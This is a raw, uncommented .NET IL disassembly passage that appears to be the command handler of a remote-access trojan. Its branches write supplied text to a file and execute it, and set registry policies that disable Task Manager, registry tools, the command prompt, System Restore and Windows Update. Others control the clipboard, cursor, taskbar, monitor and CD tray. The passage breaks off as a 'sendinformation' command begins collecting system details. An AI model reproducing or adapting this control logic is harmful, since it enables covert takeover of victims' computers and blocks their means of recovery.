      IL_0b31:  ldc.i4.0
      IL_0b32:  ldc.i4.0
      IL_0b33:  ldc.i4     0x80
      IL_0b38:  call       int32 j.OK::SetWindowPos(int32,
                                                    int32,
                                                    int32,
                                                    int32,
                                                    int32,
                                                    int32,
                                                    int32)
      IL_0b3d:  pop
      IL_0b3e:  br         IL_17d9

      IL_0b43:  nop
      IL_0b44:  ldloc.s    V_107
      IL_0b46:  ldstr      "MostrarBarraDeTarefas"
      IL_0b4b:  ldc.i4.0
      IL_0b4c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b51:  ldc.i4.0
      IL_0b52:  ceq
      IL_0b54:  stloc.s    V_138
      IL_0b56:  ldloc.s    V_138
      IL_0b58:  brfalse.s  IL_0b88

      IL_0b5a:  nop
      IL_0b5b:  ldstr      "Shell_traywnd"
      IL_0b60:  stloc.s    V_123
      IL_0b62:  ldloca.s   V_123
      IL_0b64:  ldstr      ""
      IL_0b69:  stloc.s    V_122
      IL_0b6b:  ldloca.s   V_122
      IL_0b6d:  call       int32 j.OK::FindWindow(string&,
                                                  string&)
      IL_0b72:  stloc.s    V_35
      IL_0b74:  ldloc.s    V_35
      IL_0b76:  ldc.i4.0
      IL_0b77:  ldc.i4.0
      IL_0b78:  ldc.i4.0
      IL_0b79:  ldc.i4.0
      IL_0b7a:  ldc.i4.0
      IL_0b7b:  ldc.i4.s   64
      IL_0b7d:  call       int32 j.OK::SetWindowPos(int32,
                                                    int32,
                                                    int32,
                                                    int32,
                                                    int32,
                                                    int32,
                                                    int32)
      IL_0b82:  pop
      IL_0b83:  br         IL_17d9

      IL_0b88:  nop
      IL_0b89:  ldloc.s    V_107
      IL_0b8b:  ldstr      "MonitorON"
      IL_0b90:  ldc.i4.0
      IL_0b91:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0b96:  ldc.i4.0
      IL_0b97:  ceq
      IL_0b99:  stloc.s    V_138
      IL_0b9b:  ldloc.s    V_138
      IL_0b9d:  brfalse.s  IL_0bb7

      IL_0b9f:  nop
      IL_0ba0:  ldc.i4.m1
      IL_0ba1:  ldc.i4     0x112
      IL_0ba6:  ldc.i4     0xf170
      IL_0bab:  ldc.i4.m1
      IL_0bac:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0bb1:  nop
      IL_0bb2:  br         IL_17d9

      IL_0bb7:  nop
      IL_0bb8:  ldloc.s    V_107
      IL_0bba:  ldstr      "MonitorOFF"
      IL_0bbf:  ldc.i4.0
      IL_0bc0:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bc5:  ldc.i4.0
      IL_0bc6:  ceq
      IL_0bc8:  stloc.s    V_138
      IL_0bca:  ldloc.s    V_138
      IL_0bcc:  brfalse.s  IL_0be6

      IL_0bce:  nop
      IL_0bcf:  ldc.i4.m1
      IL_0bd0:  ldc.i4     0x112
      IL_0bd5:  ldc.i4     0xf170
      IL_0bda:  ldc.i4.2
      IL_0bdb:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0be0:  nop
      IL_0be1:  br         IL_17d9

      IL_0be6:  nop
      IL_0be7:  ldloc.s    V_107
      IL_0be9:  ldstr      "script"
      IL_0bee:  ldc.i4.0
      IL_0bef:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0bf4:  ldc.i4.0
      IL_0bf5:  ceq
      IL_0bf7:  stloc.s    V_138
      IL_0bf9:  ldloc.s    V_138
      IL_0bfb:  brfalse.s  IL_0c42

      IL_0bfd:  nop
      IL_0bfe:  call       string [mscorlib]System.Environment::get_UserName()
      IL_0c03:  stloc.s    V_37
      IL_0c05:  ldc.i4.s   21
      IL_0c07:  call       string [mscorlib]System.Environment::GetFolderPath(valuetype [mscorlib]System.Environment/SpecialFolder)
      IL_0c0c:  ldstr      "\\"
      IL_0c11:  ldloc.s    V_37
      IL_0c13:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0c18:  stloc.s    V_36
      IL_0c1a:  ldloc.s    V_36
      IL_0c1c:  ldloc.0
      IL_0c1d:  ldc.i4.2
      IL_0c1e:  ldelem.ref
      IL_0c1f:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0c24:  ldloc.0
      IL_0c25:  ldc.i4.1
      IL_0c26:  ldelem.ref
      IL_0c27:  call       void [mscorlib]System.IO.File::WriteAllText(string,
                                                                       string)
      IL_0c2c:  nop
      IL_0c2d:  ldloc.s    V_36
      IL_0c2f:  ldloc.0
      IL_0c30:  ldc.i4.2
      IL_0c31:  ldelem.ref
      IL_0c32:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0c37:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0c3c:  pop
      IL_0c3d:  br         IL_17d9

      IL_0c42:  nop
      IL_0c43:  ldloc.s    V_107
      IL_0c45:  ldstr      "ClearClp"
      IL_0c4a:  ldc.i4.0
      IL_0c4b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c50:  ldc.i4.0
      IL_0c51:  ceq
      IL_0c53:  stloc.s    V_138
      IL_0c55:  ldloc.s    V_138
      IL_0c57:  brfalse.s  IL_0c6f

      IL_0c59:  nop
      IL_0c5a:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0c5f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_0c64:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::Clear()
      IL_0c69:  nop
      IL_0c6a:  br         IL_17d9

      IL_0c6f:  nop
      IL_0c70:  ldloc.s    V_107
      IL_0c72:  ldstr      "SetClp"
      IL_0c77:  ldc.i4.0
      IL_0c78:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0c7d:  ldc.i4.0
      IL_0c7e:  ceq
      IL_0c80:  stloc.s    V_138
      IL_0c82:  ldloc.s    V_138
      IL_0c84:  brfalse.s  IL_0c9f

      IL_0c86:  nop
      IL_0c87:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0c8c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer::get_Clipboard()
      IL_0c91:  ldloc.0
      IL_0c92:  ldc.i4.1
      IL_0c93:  ldelem.ref
      IL_0c94:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.ClipboardProxy::SetText(string)
      IL_0c99:  nop
      IL_0c9a:  br         IL_17d9

      IL_0c9f:  nop
      IL_0ca0:  ldloc.s    V_107
      IL_0ca2:  ldstr      "CursorShow"
      IL_0ca7:  ldc.i4.0
      IL_0ca8:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cad:  ldc.i4.0
      IL_0cae:  ceq
      IL_0cb0:  stloc.s    V_138
      IL_0cb2:  ldloc.s    V_138
      IL_0cb4:  brfalse.s  IL_0cc2

      IL_0cb6:  nop
      IL_0cb7:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::Show()
      IL_0cbc:  nop
      IL_0cbd:  br         IL_17d9

      IL_0cc2:  nop
      IL_0cc3:  ldloc.s    V_107
      IL_0cc5:  ldstr      "CursorHide"
      IL_0cca:  ldc.i4.0
      IL_0ccb:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cd0:  ldc.i4.0
      IL_0cd1:  ceq
      IL_0cd3:  stloc.s    V_138
      IL_0cd5:  ldloc.s    V_138
      IL_0cd7:  brfalse.s  IL_0ce5

      IL_0cd9:  nop
      IL_0cda:  call       void [System.Windows.Forms]System.Windows.Forms.Cursor::Hide()
      IL_0cdf:  nop
      IL_0ce0:  br         IL_17d9

      IL_0ce5:  nop
      IL_0ce6:  ldloc.s    V_107
      IL_0ce8:  ldstr      "winupdateon"
      IL_0ced:  ldc.i4.0
      IL_0cee:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0cf3:  ldc.i4.0
      IL_0cf4:  ceq
      IL_0cf6:  stloc.s    V_138
      IL_0cf8:  ldloc.s    V_138
      IL_0cfa:  brfalse.s  IL_0d22

      IL_0cfc:  nop
      IL_0cfd:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0d02:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0d07:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\Explorer"
      IL_0d0c:  ldstr      "NoWindowsUpdate"
      IL_0d11:  ldstr      "0"
      IL_0d16:  ldc.i4.4
      IL_0d17:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0d1c:  nop
      IL_0d1d:  br         IL_17d9

      IL_0d22:  nop
      IL_0d23:  ldloc.s    V_107
      IL_0d25:  ldstr      "winupdateoff"
      IL_0d2a:  ldc.i4.0
      IL_0d2b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d30:  ldc.i4.0
      IL_0d31:  ceq
      IL_0d33:  stloc.s    V_138
      IL_0d35:  ldloc.s    V_138
      IL_0d37:  brfalse.s  IL_0d5f

      IL_0d39:  nop
      IL_0d3a:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0d3f:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0d44:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\Explorer"
      IL_0d49:  ldstr      "NoWindowsUpdate"
      IL_0d4e:  ldstr      "1"
      IL_0d53:  ldc.i4.4
      IL_0d54:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0d59:  nop
      IL_0d5a:  br         IL_17d9

      IL_0d5f:  nop
      IL_0d60:  ldloc.s    V_107
      IL_0d62:  ldstr      "DisableCMD"
      IL_0d67:  ldc.i4.0
      IL_0d68:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0d6d:  ldc.i4.0
      IL_0d6e:  ceq
      IL_0d70:  stloc.s    V_138
      IL_0d72:  ldloc.s    V_138
      IL_0d74:  brfalse.s  IL_0d9c

      IL_0d76:  nop
      IL_0d77:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0d7c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0d81:  ldstr      "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Wind"
      + "ows\\System"
      IL_0d86:  ldstr      "DisableCMD"
      IL_0d8b:  ldstr      "1"
      IL_0d90:  ldc.i4.4
      IL_0d91:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0d96:  nop
      IL_0d97:  br         IL_17d9

      IL_0d9c:  nop
      IL_0d9d:  ldloc.s    V_107
      IL_0d9f:  ldstr      "EnableCMD"
      IL_0da4:  ldc.i4.0
      IL_0da5:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0daa:  ldc.i4.0
      IL_0dab:  ceq
      IL_0dad:  stloc.s    V_138
      IL_0daf:  ldloc.s    V_138
      IL_0db1:  brfalse.s  IL_0dd9

      IL_0db3:  nop
      IL_0db4:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0db9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0dbe:  ldstr      "HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\Wind"
      + "ows\\System"
      IL_0dc3:  ldstr      "DisableCMD"
      IL_0dc8:  ldstr      "0"
      IL_0dcd:  ldc.i4.4
      IL_0dce:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0dd3:  nop
      IL_0dd4:  br         IL_17d9

      IL_0dd9:  nop
      IL_0dda:  ldloc.s    V_107
      IL_0ddc:  ldstr      "DisableRegistry"
      IL_0de1:  ldc.i4.0
      IL_0de2:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0de7:  ldc.i4.0
      IL_0de8:  ceq
      IL_0dea:  stloc.s    V_138
      IL_0dec:  ldloc.s    V_138
      IL_0dee:  brfalse.s  IL_0e16

      IL_0df0:  nop
      IL_0df1:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0df6:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0dfb:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_0e00:  ldstr      "DisableRegistryTools"
      IL_0e05:  ldstr      "1"
      IL_0e0a:  ldc.i4.4
      IL_0e0b:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0e10:  nop
      IL_0e11:  br         IL_17d9

      IL_0e16:  nop
      IL_0e17:  ldloc.s    V_107
      IL_0e19:  ldstr      "EnableRegistry"
      IL_0e1e:  ldc.i4.0
      IL_0e1f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e24:  ldc.i4.0
      IL_0e25:  ceq
      IL_0e27:  stloc.s    V_138
      IL_0e29:  ldloc.s    V_138
      IL_0e2b:  brfalse.s  IL_0e53

      IL_0e2d:  nop
      IL_0e2e:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0e33:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0e38:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_0e3d:  ldstr      "DisableRegistryTools"
      IL_0e42:  ldstr      "0"
      IL_0e47:  ldc.i4.4
      IL_0e48:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0e4d:  nop
      IL_0e4e:  br         IL_17d9

      IL_0e53:  nop
      IL_0e54:  ldloc.s    V_107
      IL_0e56:  ldstr      "DisableRestore"
      IL_0e5b:  ldc.i4.0
      IL_0e5c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e61:  ldc.i4.0
      IL_0e62:  ceq
      IL_0e64:  stloc.s    V_138
      IL_0e66:  ldloc.s    V_138
      IL_0e68:  brfalse.s  IL_0e90

      IL_0e6a:  nop
      IL_0e6b:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0e70:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0e75:  ldstr      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\C"
      + "urrentVersion\\SystemRestore"
      IL_0e7a:  ldstr      "DisableSR"
      IL_0e7f:  ldstr      "1"
      IL_0e84:  ldc.i4.4
      IL_0e85:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0e8a:  nop
      IL_0e8b:  br         IL_17d9

      IL_0e90:  nop
      IL_0e91:  ldloc.s    V_107
      IL_0e93:  ldstr      "EnableRestore"
      IL_0e98:  ldc.i4.0
      IL_0e99:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0e9e:  ldc.i4.0
      IL_0e9f:  ceq
      IL_0ea1:  stloc.s    V_138
      IL_0ea3:  ldloc.s    V_138
      IL_0ea5:  brfalse.s  IL_0ecd

      IL_0ea7:  nop
      IL_0ea8:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0ead:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0eb2:  ldstr      "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\C"
      + "urrentVersion\\SystemRestore"
      IL_0eb7:  ldstr      "DisableSR"
      IL_0ebc:  ldstr      "0"
      IL_0ec1:  ldc.i4.4
      IL_0ec2:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0ec7:  nop
      IL_0ec8:  br         IL_17d9

      IL_0ecd:  nop
      IL_0ece:  ldloc.s    V_107
      IL_0ed0:  ldstr      "DisableTaskManager"
      IL_0ed5:  ldc.i4.0
      IL_0ed6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0edb:  ldc.i4.0
      IL_0edc:  ceq
      IL_0ede:  stloc.s    V_138
      IL_0ee0:  ldloc.s    V_138
      IL_0ee2:  brfalse.s  IL_0f0a

      IL_0ee4:  nop
      IL_0ee5:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0eea:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0eef:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_0ef4:  ldstr      "DisableTaskMgr"
      IL_0ef9:  ldstr      "1"
      IL_0efe:  ldc.i4.4
      IL_0eff:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0f04:  nop
      IL_0f05:  br         IL_17d9

      IL_0f0a:  nop
      IL_0f0b:  ldloc.s    V_107
      IL_0f0d:  ldstr      "EnableTaskManager"
      IL_0f12:  ldc.i4.0
      IL_0f13:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f18:  ldc.i4.0
      IL_0f19:  ceq
      IL_0f1b:  stloc.s    V_138
      IL_0f1d:  ldloc.s    V_138
      IL_0f1f:  brfalse.s  IL_0f47

      IL_0f21:  nop
      IL_0f22:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_0f27:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_0f2c:  ldstr      "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Curre"
      + "ntVersion\\Policies\\System"
      IL_0f31:  ldstr      "DisableTaskMgr"
      IL_0f36:  ldstr      "0"
      IL_0f3b:  ldc.i4.4
      IL_0f3c:  callvirt   instance void [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::SetValue(string,
                                                                                                                         string,
                                                                                                                         object,
                                                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0f41:  nop
      IL_0f42:  br         IL_17d9

      IL_0f47:  nop
      IL_0f48:  ldloc.s    V_107
      IL_0f4a:  ldstr      "TurnOffMonitor"
      IL_0f4f:  ldc.i4.0
      IL_0f50:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f55:  ldc.i4.0
      IL_0f56:  ceq
      IL_0f58:  stloc.s    V_138
      IL_0f5a:  ldloc.s    V_138
      IL_0f5c:  brfalse.s  IL_0f76

      IL_0f5e:  nop
      IL_0f5f:  ldc.i4.m1
      IL_0f60:  ldc.i4     0x112
      IL_0f65:  ldc.i4     0xf170
      IL_0f6a:  ldc.i4.2
      IL_0f6b:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0f70:  nop
      IL_0f71:  br         IL_17d9

      IL_0f76:  nop
      IL_0f77:  ldloc.s    V_107
      IL_0f79:  ldstr      "Stillness"
      IL_0f7e:  ldc.i4.0
      IL_0f7f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0f84:  ldc.i4.0
      IL_0f85:  ceq
      IL_0f87:  stloc.s    V_138
      IL_0f89:  ldloc.s    V_138
      IL_0f8b:  brfalse.s  IL_0fa5

      IL_0f8d:  nop
      IL_0f8e:  ldc.i4.m1
      IL_0f8f:  ldc.i4     0x112
      IL_0f94:  ldc.i4     0xf170
      IL_0f99:  ldc.i4.2
      IL_0f9a:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0f9f:  nop
      IL_0fa0:  br         IL_17d9

      IL_0fa5:  nop
      IL_0fa6:  ldloc.s    V_107
      IL_0fa8:  ldstr      "TurnOnMonitor"
      IL_0fad:  ldc.i4.0
      IL_0fae:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0fb3:  ldc.i4.0
      IL_0fb4:  ceq
      IL_0fb6:  stloc.s    V_138
      IL_0fb8:  ldloc.s    V_138
      IL_0fba:  brfalse.s  IL_0fd4

      IL_0fbc:  nop
      IL_0fbd:  ldc.i4.m1
      IL_0fbe:  ldc.i4     0x112
      IL_0fc3:  ldc.i4     0xf170
      IL_0fc8:  ldc.i4.m1
      IL_0fc9:  call       void j.OK::SendMessage(int32,
                                                  uint32,
                                                  uint32,
                                                  int32)
      IL_0fce:  nop
      IL_0fcf:  br         IL_17d9

      IL_0fd4:  nop
      IL_0fd5:  ldloc.s    V_107
      IL_0fd7:  ldstr      "opencd"
      IL_0fdc:  ldc.i4.0
      IL_0fdd:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0fe2:  ldc.i4.0
      IL_0fe3:  ceq
      IL_0fe5:  stloc.s    V_138
      IL_0fe7:  ldloc.s    V_138
      IL_0fe9:  brfalse.s  IL_1022

      IL_0feb:  nop
      IL_0fec:  nop
      .try
      {
        IL_0fed:  ldstr      "set cdaudio door open"
        IL_0ff2:  stloc.s    V_123
        IL_0ff4:  ldloca.s   V_123
        IL_0ff6:  ldc.i4.0
        IL_0ff7:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_0ffc:  stloc.s    V_122
        IL_0ffe:  ldloca.s   V_122
        IL_1000:  ldc.i4.0
        IL_1001:  conv.i8
        IL_1002:  ldc.i4.0
        IL_1003:  conv.i8
        IL_1004:  call       int64 j.OK::mciSendString(string&,
                                                       string&,
                                                       int64,
                                                       int64)
        IL_1009:  pop
        IL_100a:  leave.s    IL_101c

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_100c:  dup
        IL_100d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1012:  stloc.s    V_40
        IL_1014:  nop
        IL_1015:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_101a:  leave.s    IL_101c

      }  // end handler
      IL_101c:  nop
      IL_101d:  br         IL_17d9

      IL_1022:  nop
      IL_1023:  ldloc.s    V_107
      IL_1025:  ldstr      "closecd"
      IL_102a:  ldc.i4.0
      IL_102b:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_1030:  ldc.i4.0
      IL_1031:  ceq
      IL_1033:  stloc.s    V_138
      IL_1035:  ldloc.s    V_138
      IL_1037:  brfalse.s  IL_1070

      IL_1039:  nop
      IL_103a:  nop
      .try
      {
        IL_103b:  ldstr      "set cdaudio door closed"
        IL_1040:  stloc.s    V_123
        IL_1042:  ldloca.s   V_123
        IL_1044:  ldc.i4.0
        IL_1045:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
        IL_104a:  stloc.s    V_122
        IL_104c:  ldloca.s   V_122
        IL_104e:  ldc.i4.0
        IL_104f:  conv.i8
        IL_1050:  ldc.i4.0
        IL_1051:  conv.i8
        IL_1052:  call       int64 j.OK::mciSendString(string&,
                                                       string&,
                                                       int64,
                                                       int64)
        IL_1057:  pop
        IL_1058:  leave.s    IL_106a

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_105a:  dup
        IL_105b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_1060:  stloc.s    V_41
        IL_1062:  nop
        IL_1063:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_1068:  leave.s    IL_106a

      }  // end handler
      IL_106a:  nop
      IL_106b:  br         IL_17d9

      IL_1070:  nop
      IL_1071:  ldloc.s    V_107
      IL_1073:  ldstr      "sendinformation"
      IL_1078:  ldc.i4.0
      IL_1079:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_107e:  ldc.i4.0
      IL_107f:  ceq
      IL_1081:  stloc.s    V_138
      IL_1083:  ldloc.s    V_138
      IL_1085:  brfalse    IL_11b4

      IL_108a:  nop
      IL_108b:  call       class My.MyComputer My.MyProject::get_Computer()
      IL_1090:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Clock()
      IL_1095:  callvirt   instance int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Clock::get_TickCount()
      IL_109a:  stloc.s    V_52
      IL_109c:  ldloc.s    V_52
      IL_109e:  ldc.i4     0x36ee80
      IL_10a3:  div
      IL_10a4:  stloc.s    V_49
      IL_10a6:  ldloc.s    V_52
      IL_10a8:  ldc.i4     0x36ee80
      IL_10ad:  rem
      IL_10ae:  ldc.i4     0xea60
      IL_10b3:  div
      IL_10b4:  stloc.s    V_50
      IL_10b6:  ldloc.s    V_52
      IL_10b8:  ldc.i4     0x36ee80
      IL_10bd:  rem
      IL_10be:  ldc.i4     0xea60
